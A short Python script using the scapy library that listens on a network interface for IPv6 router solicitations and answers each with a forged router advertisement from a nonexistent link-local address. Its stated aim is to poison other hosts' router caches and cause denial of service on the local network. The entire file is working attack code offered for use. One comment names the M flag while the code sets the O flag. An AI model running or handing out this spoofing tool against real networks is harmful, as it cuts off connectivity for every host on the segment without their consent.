#!/usr/bin/python

# Jack Cardwell
# February 12, 2018

# routerPoisoning.py is a program that creates fake router advertisement messages in order to corrupt
# the router caches on other systems

# LIBRARY IMPORTS
from scapy.all import *
from sys import *

def spoofAdvertisements(packet):

    # examine the type of the packet to check if it is a router solicitation message
    if (packet.haslayer(ICMPv6ND_RS)):

        # get the layers from the packet
        ip = packet.getlayer(IPv6)
        icmp6 = packet.getlayer(ICMPv6ND_RS)

        # print that we received this packet
        print("Received Router solicitation packet from: "+str(ip.src))

        # craft the response packet that will be sent...set the source to be nonsensical to create DOS
        responseIP = IPv6(dst = "ff02::1", src = "fe80::de:de:de:de") # send the packet to all nodes on the local network
        responseICMP = ICMPv6ND_RA()

        # set the M flag to draw more traffic to this non-existent router...DHCPv6 traffic
        responseICMP.O = 1
        responseICMP.routerlifetime = 9000  # initialize it to the longest possible time in seconds

        # send the packet
        send(responseIP/responseICMP)

# listen for all messages on the "eth0" interface
sniff(iface = "eth0", prn = spoofAdvertisements)
